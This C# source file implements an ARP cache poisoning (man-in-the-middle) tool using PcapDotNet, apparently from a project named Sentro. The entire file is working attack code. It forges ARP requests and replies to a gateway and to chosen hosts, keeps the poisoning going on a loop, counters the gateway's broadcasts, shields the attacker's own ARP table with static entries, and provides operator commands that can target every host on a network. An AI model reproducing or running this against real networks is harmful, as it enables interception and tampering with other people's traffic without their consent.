using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using PcapDotNet.Core;
using PcapDotNet.Core.Extensions;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Arp;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.IpV4;
using Sentro.Utilities;

namespace Sentro.ARPSpoofer
{
    /*
        Responsipility : Perform ARP Cache Poison attack 
        ToDo: what if a machine changed it's ip address with another machine (rare case)
        
    */
    public class ArpSpoofer : IArpSpoofer
    {
        public const string Tag = "ArpSpoofer";
        private static ArpSpoofer _arpSpoofer;
        private Dictionary<string, string> _targetsIpToMac;
        private HashSet<string> _excludedTargets;
        private HashSet<string> _targetsIps;
        private string _myMac,_gatewayIp,_gatewayMac;
        
        /*packet builders grouped here to avoid creating a new builder with each packet sent*/
        private Dictionary<string,PacketBuilder> _targetsPacketBuilders;
        private Dictionary<string,PacketBuilder> _gatewayPacketBuilders;

        /*report the detection or removal of current targeted machines
          targets list is rebuild in case of change*/
        private bool _targetsChanged;
        
        /*report the status of ARP spoofer */
        private Status _status = Status.Off;
      
        private ArpSpoofer()
        {
            _targetsIpToMac = new Dictionary<string, string>();  
            _excludedTargets = new HashSet<string>();
            _targetsPacketBuilders = new Dictionary<string, PacketBuilder>();
            _gatewayPacketBuilders = new Dictionary<string, PacketBuilder>();
        }

        public static ArpSpoofer GetInstance()
        {
            return _arpSpoofer ?? (_arpSpoofer = new ArpSpoofer());
        }
        
        public void Spoof(string myIp, HashSet<string> targets)//hashset is used to eliminate duplicate IPs
        {
            _status = Status.Starting;

            var nic = NetworkUtilites.GetLivePacketDevice(myIp);            

            _targetsIps = targets;
            _myMac = nic.GetMacAddress().ToString();
            _gatewayIp = NetworkUtilites.GetGatewayIp(nic);
            _gatewayMac = NetworkUtilites.GetMacAddress(_gatewayIp);

            /*targets rarely change their mac, also this function considerd costly*/
            //TODO: implement a function to find mac address of list of targets at once (performace)
            foreach (var ip in targets) 
                _targetsIpToMac.Add(ip,NetworkUtilites.GetMacAddress(ip));

            string[] targetsArray = _targetsIps.ToArray();
            using (PacketCommunicator communicator = nic.Open(200, PacketDeviceOpenAttributes.None, 50))
            {
                /*here is the trick for fixing self poison static arp entry*/
                var networkInterface = nic.GetNetworkInterface();
                NetworkUtilites.InsertStaticMac(networkInterface,_gatewayIp, _gatewayMac);
                foreach (var t in targetsArray)
                    NetworkUtilites.InsertStaticMac(networkInterface,t, _targetsIpToMac[t]);

                communicator.SetFilter("arp && ether dst ff:ff:ff:ff:ff:ff");
                Task.Run(() => FightBackAnnoyingBroadcasts(communicator));
                
                #region initiate attack
                /*start poison with fake requests*/
                foreach (string target in targetsArray)
                {
                    SpoofGatewayInitialRequest(communicator, target);
                    SpoofTargetInitialRequest(communicator, target);
                }
                #endregion

                #region keep attack alive
                /*keep poison with replays*/
                var settings = Settings.GetInstance();
                while (_status == Status.Started || _status == Status.Starting || _status == Status.Paused)
                {                    
                    if (_status == Status.Paused)
                    {
                        Thread.Sleep(5000);
                        continue;
                    }

                    if (_targetsChanged)
                        targetsArray = _targetsIps.ToArray();
                    _status = Status.Started;

                    foreach (string target in targetsArray)
                    {
                        SpoofGateway(communicator,target);
                        SpoofTarget(communicator,target);
                    }                    
                    
                    Thread.Sleep(Convert.ToInt32(settings.Setting.arpSpoofer.frequency));
                }
                #endregion

                #region finish attack
                /*end poison with real requests*/
                foreach (string target in targetsArray)
                {
                    SpoofGatewayFinalRequest(communicator, target);
                    SpoofTargetFinalRequest(communicator, target);
                }
                #endregion

                NetworkUtilites.DeleteStaticMac(networkInterface,_gatewayIp);
                foreach (var t in targetsArray)
                    NetworkUtilites.DeleteStaticMac(networkInterface,t);
                _status = Status.Stopped;
            }

        }


        private void FightBackAnnoyingBroadcasts(PacketCommunicator communicator)
        {
            ILogger logger = ConsoleLogger.GetInstance();
            var ether = new EthernetLayer
            {
                Source = new MacAddress(_myMac),
                Destination = new MacAddress("FF:FF:FF:FF:FF:FF"),
                EtherType = EthernetType.None
            };

            /*because it might be disposed from Spoof function when spoofing is stopped*/
            while (communicator != null)
            {
                communicator.ReceivePackets(0, arp =>
                {
                    var sourceIp = arp.Ethernet.IpV4.Source.ToString();
                    if (sourceIp.Equals(_gatewayIp))
                    {             
                        logger.Log(Tag,LogLevel.Info,$"gateway asks for {arp.Ethernet.IpV4.Destination.ToString()}");           
                        var arplayer = new ArpLayer
                        {
                            ProtocolType = EthernetType.IpV4,
                            Operation = ArpOperation.Request,
                            SenderHardwareAddress = ether.Source.ToBytes(),
                            SenderProtocolAddress = new IpV4Address(_gatewayIp).ToBytes(),
                            TargetHardwareAddress = MacAddress.Zero.ToBytes(),
                            TargetProtocolAddress = arp.Ethernet.IpV4.Destination.ToBytes()
                        };
                        var packet = new PacketBuilder(ether,arplayer).Build(DateTime.Now);
                        communicator.SendPacket(packet);
                    }
                    else if (_targetsIpToMac.ContainsKey(sourceIp))
                    {
                        logger.Log(Tag,LogLevel.Info,$"{sourceIp} asks for gateway");
                        SpoofGateway(communicator,sourceIp);
                    }

                });
            }
        }

        private void SpoofGatewayInitialRequest(PacketCommunicator communicator, string targetIp)
        {
            var ether = new EthernetLayer
            {
                Source = new MacAddress(_myMac),
                Destination = new MacAddress(_gatewayMac),
                EtherType = EthernetType.None,
            };
            var arp = new ArpLayer
            {
                ProtocolType = EthernetType.IpV4,
                Operation = ArpOperation.Request,
                SenderHardwareAddress = ether.Source.ToBytes(),
                SenderProtocolAddress = new IpV4Address(targetIp).ToBytes(),
                TargetHardwareAddress = MacAddress.Zero.ToBytes(),
                TargetProtocolAddress = new IpV4Address(_gatewayIp).ToBytes()
            };
            var packet = new PacketBuilder(ether, arp).Build(DateTime.Now);
            communicator.SendPacket(packet);
        }

        private void SpoofTargetInitialRequest(PacketCommunicator communicator, string targetIp)
        {
            var ether = new EthernetLayer
            {
                Source = new MacAddress(_myMac),                
                Destination = new MacAddress(_targetsIpToMac[targetIp]),
                EtherType = EthernetType.None,
            };
            var arp = new ArpLayer
            {
                ProtocolType = EthernetType.IpV4,
                Operation = ArpOperation.Request,
                SenderHardwareAddress = ether.Source.ToBytes(),
                SenderProtocolAddress = new IpV4Address(_gatewayIp).ToBytes(),
                TargetHardwareAddress = MacAddress.Zero.ToBytes(),
                TargetProtocolAddress = new IpV4Address(targetIp).ToBytes()
            };
            var packet = new PacketBuilder(ether, arp).Build(DateTime.Now);
            communicator.SendPacket(packet);
        }

        private void SpoofGateway(PacketCommunicator communicator, string targetIp)
        {
            if (!_gatewayPacketBuilders.ContainsKey(targetIp))
            {
                var ether = new EthernetLayer
                {
                    Source = new MacAddress(_myMac),
                    Destination = new MacAddress(_gatewayMac),
                    EtherType = EthernetType.None,
                };
                var arp = new ArpLayer
                {
                    ProtocolType = EthernetType.IpV4,
                    Operation = ArpOperation.Reply,
                    SenderHardwareAddress = ether.Source.ToBytes(),
                    SenderProtocolAddress = new IpV4Address(targetIp).ToBytes(),
                    TargetHardwareAddress = ether.Destination.ToBytes(),
                    TargetProtocolAddress = new IpV4Address(_gatewayIp).ToBytes()
                };

                _gatewayPacketBuilders.Add(targetIp,new PacketBuilder(ether,arp));                
            }

            Console.WriteLine(_gatewayMac);
            var packet = _gatewayPacketBuilders[targetIp].Build(DateTime.Now);
            communicator.SendPacket(packet);
        }

        private void SpoofTarget(PacketCommunicator communicator, string targetIp)
        {
            if (!_targetsPacketBuilders.ContainsKey(targetIp))
            {
                var ether = new EthernetLayer
                {
                    Source = new MacAddress(_myMac),
                    Destination = new MacAddress(_targetsIpToMac[targetIp]),
                    EtherType = EthernetType.None,
                };
                var arp = new ArpLayer
                {
                    ProtocolType = EthernetType.IpV4,
                    Operation = ArpOperation.Reply,
                    SenderHardwareAddress = ether.Source.ToBytes(),
                    SenderProtocolAddress = new IpV4Address(_gatewayIp).ToBytes(),
                    TargetHardwareAddress = ether.Destination.ToBytes(),
                    TargetProtocolAddress = new IpV4Address(targetIp).ToBytes()
                };

                _targetsPacketBuilders.Add(targetIp, new PacketBuilder(ether, arp));              
            }

            var packet = _targetsPacketBuilders[targetIp].Build(DateTime.Now);
            communicator.SendPacket(packet);
        }

        private void SpoofGatewayFinalRequest(PacketCommunicator communicator, string targetIp)
        {
            var ether = new EthernetLayer
            {
                Source = new MacAddress(_myMac),
                Destination = new MacAddress(_gatewayMac),
                EtherType = EthernetType.None,
            };
            var arp = new ArpLayer
            {
                ProtocolType = EthernetType.IpV4,
                Operation = ArpOperation.Request,
                SenderHardwareAddress = new MacAddress(_targetsIpToMac[targetIp]).ToBytes(),
                SenderProtocolAddress = new IpV4Address(targetIp).ToBytes(),
                TargetHardwareAddress = MacAddress.Zero.ToBytes(),
                TargetProtocolAddress = new IpV4Address(_gatewayIp).ToBytes()
            };
            var packet = new PacketBuilder(ether, arp).Build(DateTime.Now);
            communicator.SendPacket(packet);
        }

        private void SpoofTargetFinalRequest(PacketCommunicator communicator, string targetIp)
        {
            var ether = new EthernetLayer
            {
                Source = new MacAddress(_myMac),
                Destination = new MacAddress(_targetsIpToMac[targetIp]),
                EtherType = EthernetType.None,
            };
            var arp = new ArpLayer
            {
                ProtocolType = EthernetType.IpV4,
                Operation = ArpOperation.Request,
                SenderHardwareAddress = new MacAddress(_gatewayMac).ToBytes(),
                SenderProtocolAddress = new IpV4Address(_gatewayIp).ToBytes(),
                TargetHardwareAddress = MacAddress.Zero.ToBytes(),
                TargetProtocolAddress = new IpV4Address(targetIp).ToBytes()
            };
            var packet = new PacketBuilder(ether, arp).Build(DateTime.Now);
            communicator.SendPacket(packet);
        }


        public void Spoof(string myIp)
        {
            throw new NotImplementedException();
        }

        public void Include(string target)
        {
            _targetsIps.Add(target);
            _targetsChanged = true;
        }

        public void Include(HashSet<string> targets)
        {            
            _targetsIps.UnionWith(targets);
            _targetsChanged = true;
        }

        public void Exclude(string target)
        {
            _targetsIps.Remove(target);
            _excludedTargets.Add(target);
            _targetsChanged = true;
        }

        public void Exclude(HashSet<string> targets)
        {
            _targetsIps.ExceptWith(targets);
            _excludedTargets.UnionWith(targets);
            _targetsChanged = true;
        }

        public void Stop()
        {
            _status = Status.Stopping;
            while (_status != Status.Stopped)            
                Thread.Sleep(100);            
        }    

        public void Pause() => _status = Status.Paused;

        public void Resume() => _status = Status.Starting;

        public void Start() => _status = Status.Starting;

        public void Usage()
        {
            var usage = @"
arp [Your IP] spoof [Set of target ips]
arp [Your IP] spoof all -[Exclude target ip] .. -[Exclude target ip]
arp +[Include target ip] .. +[Include target ip] .. -[Exclude target ip]
arp stop
arp pause
arp start
arp resume
arp
";
            Console.WriteLine(usage);
        }

        public Status State() => _status;

        public enum Status
        {
            Paused,
            Stopped,
            Stopping,
            Starting,
            Started,
            Off
        }

    }
}
